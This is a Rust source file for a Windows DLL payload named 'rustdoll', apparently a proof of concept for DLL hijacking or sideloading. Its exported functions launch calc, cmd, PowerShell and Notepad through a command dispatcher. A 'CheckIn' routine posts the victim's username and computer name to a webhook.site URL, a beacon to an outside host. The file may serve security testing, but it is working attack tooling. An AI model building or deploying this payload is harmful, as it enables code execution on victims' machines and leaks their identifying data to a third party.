use std::process::Command;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use windows_sys::Win32::UI::WindowsAndMessaging::{MessageBoxW, MB_OK};
use windows_sys::Win32::System::Console::AllocConsole;

#[no_mangle]
pub extern "system" fn DllMain(_hinst: u32, reason: u32, _: *mut std::ffi::c_void) -> i32 {
    if reason == 1 { unsafe { AllocConsole(); } }
    1
}

// Exported entry points for direct calling (e.g., via GetProcAddress)
#[no_mangle]
pub extern "system" fn Calc() { let _ = Command::new("calc.exe").spawn(); }

#[no_mangle]
pub extern "system" fn Cmd() { let _ = Command::new("cmd.exe").spawn(); }

#[no_mangle]
pub extern "system" fn Powershell() { let _ = Command::new("powershell.exe").spawn(); }

#[no_mangle]
pub extern "system" fn Notepad() { let _ = Command::new("notepad.exe").spawn(); }

#[no_mangle]
pub extern "system" fn Popup() { show_popup("rustdoll", "Module Executed"); }

#[no_mangle]
pub extern "system" fn VisitUrl() { visit_url_logic(); }

#[no_mangle]
pub extern "system" fn CheckIn() { check_in_logic(); }

#[no_mangle]
pub extern "system" fn RunAll() {
    let _ = Command::new("calc.exe").spawn();
    let _ = Command::new("notepad.exe").spawn();
}

// Universal entry point
#[no_mangle]
pub extern "system" fn ExecuteCommand(command_ptr: *const u16) {
    if command_ptr.is_null() { return; }
    
    let cmd = unsafe {
        let mut len = 0;
        while *command_ptr.add(len) != 0 { len += 1; }
        String::from_utf16_lossy(std::slice::from_raw_parts(command_ptr, len))
    };

    println!("[*] Received command: {}", cmd);

    match cmd.as_str() {
        "Calc" => Calc(),
        "Cmd" => Cmd(),
        "Powershell" => Powershell(),
        "Notepad" => Notepad(),
        "Popup" => Popup(),
        "VisitUrl" => VisitUrl(),
        "CheckIn" => CheckIn(),
        "RunAll" => RunAll(),
        _ => println!("[!] Unknown command: {}", cmd),
    }
}

fn visit_url_logic() {
    let url = "https://webhook.site/6fd54d41-ae01-42b2-89af-a05736f0a914";
    match reqwest::blocking::get(url) {
        Ok(res) => println!("[+] VisitUrl Success: Status {}", res.status()),
        Err(e) => eprintln!("[!] VisitUrl FAILED: {:?}", e),
    }
}

fn check_in_logic() {
    let url = "https://webhook.site/6fd54d41-ae01-42b2-89af-a05736f0a914";
    let user = std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".into());
    let host = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".into());
    
    println!("[*] Checking in as {}@{}...", user, host);
    
    let client = reqwest::blocking::Client::new();
    let body = format!("User: {}, Host: {}", user, host);
    
    match client.post(url).body(body).send() {
        Ok(res) => println!("[+] CheckIn Success: {}", res.status()),
        Err(e) => eprintln!("[!] CheckIn FAILED: {:?}", e),
    }
}

fn show_popup(title: &str, message: &str) {
    let t: Vec<u16> = OsStr::new(title).encode_wide().chain(std::iter::once(0)).collect();
    let m: Vec<u16> = OsStr::new(message).encode_wide().chain(std::iter::once(0)).collect();
    unsafe { MessageBoxW(ptr::null_mut(), m.as_ptr(), t.as_ptr(), MB_OK); }
}